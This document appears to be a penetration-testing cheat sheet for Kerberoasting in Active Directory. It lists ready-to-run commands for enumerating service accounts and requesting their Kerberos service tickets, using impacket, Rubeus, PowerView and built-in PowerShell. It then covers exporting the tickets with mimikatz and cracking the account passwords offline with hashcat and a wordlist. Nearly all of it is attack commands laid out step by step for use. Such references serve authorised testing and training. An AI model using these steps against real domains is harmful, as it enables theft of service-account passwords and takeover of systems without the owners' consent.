> **Attack explaination**:
> We request Kerberos TGS ticket(s) from account(s) with SPN (Service Principal Name). SPN looks like this: `Domain.local/user`. The ticket is encrypted using the account's `NTLM` hash.
> 
> We cannot use this requested ticket to authenticate or run command with this user's privilege.
> 
> So, we can use the whole requested ticket and feed it to `hashcat` to crack that account's password. The attack won't work when that account has a complex password and we cannot crack it.
>
> `Hashcat` mode  is `13100`. Or you can just not specify it, it will auto detect

## Linux attacker

### Enumerate all accounts with SPN


```sh
impacket-GetUserSPNs -dc-ip $target "$domain/$user:$pass"
```

### Attack all account

Request all Kerberos TGS ticket from all accounts that has principal name. Need valid credential.

```sh
impacket-GetUserSPNs -dc-ip $target "$domain/$user:$pass" -request
```

### Attack specific account

Request Kerberos TGS ticket from a specific account that has principal name. Need valid credential.

```sh
GetUserSPNs.py -dc-ip $target "$domain/$user:$pass" -request-user user
```

### Crack ticket

```sh
hashcat -a 0 '$krb5tgs$23$*user$DOMAIN.LOCAL$DOMAIN/user*$ce029eed<redacted>' /usr/share/wordlists/rockyou.txt
```

## Domain-joined windows attacker

> 3 methods to accomplish the same thing.
### `Rubeus` (automated)

#### Attack all account

```powershell
.\Rubeus.exe kerberoast /nowrap
```

#### Attack admin accounts

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

#### Attack specific account

```powershell
.\Rubeus.exe kerberoast /user:'user' /nowrap
```

### `Powerview` (automated)

#### Enumerate all accounts with SPN

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname,serviceprincipalname
```

#### Attack all accounts

And export it into a `csv` file for your convenience

```powershell
Get-DomainUser -Identity */* -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\TGS.csv -NoTypeInformation
```

#### Attack specific account

```powershell
Get-DomainUser -Identity user | Get-DomainSPNTicket -Format Hashcat
```

### `Mimikatz` (manual)

#### Enumerate all accounts with SPN

```cmd
setspn.exe -Q */*
```

#### Request TGS for all accounts

```powershell
setspn.exe -T $domain -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

> After doing this, use `mimikatz` to extract the ticket

#### Request TGS for specific account

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "$domain/$user"
```

> After doing this, use `mimikatz` to extract the ticket

#### Extracting tickets with `mimikatz`

```cmd
.\mimikatz.exe

mimikatz # privilege::debug
mimikatz # base64 /out:true
kerberos::list /export
```

#### Crack the ticket

Use the base64 blob we got from `mimikatz`

```sh
echo "<base64 blob>" |  tr -d \\n | base64 -d > user.kirbi
kirbi2john user.kirbi
```

Optional: modify the output file to be usable for hashcat:

```sh
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > user.tgs
```

### `Hashcat` to crack

```sh
hashcat -a 0 '$krb5tgs$23$*user$DOMAIN.LOCAL$DOMAIN/user*$ce029eed<redacted>' /usr/share/wordlists/rockyou.txt
```